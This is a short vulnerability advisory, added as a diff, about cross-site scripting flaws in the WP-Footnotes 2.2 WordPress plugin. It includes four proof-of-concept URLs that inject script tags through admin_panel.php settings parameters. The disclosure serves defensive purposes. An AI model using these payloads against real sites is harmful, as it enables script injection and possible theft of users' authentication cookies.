@@ -1,0 +1,15 @@
+source: http://www.securityfocus.com/bid/27572/info
+
+WP-Footnotes plugin for WordPress is prone to multiple cross-site scripting vulnerabilities because the application fails to properly sanitize user-supplied input. The plugin also insecurely exposes administrative functionality.
+
+An attacker may leverage these issues to execute arbitrary script code in the browser of an unsuspecting user in the context of the affected site. This may help the attacker steal cookie-based authentication credentials and launch other attacks.
+
+This issue affects WP-Footnotes 2.2; other versions may also be vulnerable. 
+
+http://www.example.com/wordpress/wp-content/plugins/wp-footnotes/admin_panel.php?wp_footnotes_current_settings[priority]="><script>alert("XSS")</script>
+
+http://www.example.com/wordpress/wp-content/plugins/wp-footnotes/admin_panel.php?wp_footnotes_current_settings[style_rules]=&lt;/textarea&gt;<script>alert("XSS")</script>
+
+http://www.example.com/wordpress/wp-content/plugins/admin_panel.php?wp_footnotes_current_settings[pre_footnotes]=&lt;/textarea&gt;<script>alert("XSS")</script>
+
+http://www.example.com/wordpress/wp-content/plugins/admin_panel.php?wp_footnotes_current_settings[post_footnotes]=&lt;/textarea&gt;<script>alert(":-(")
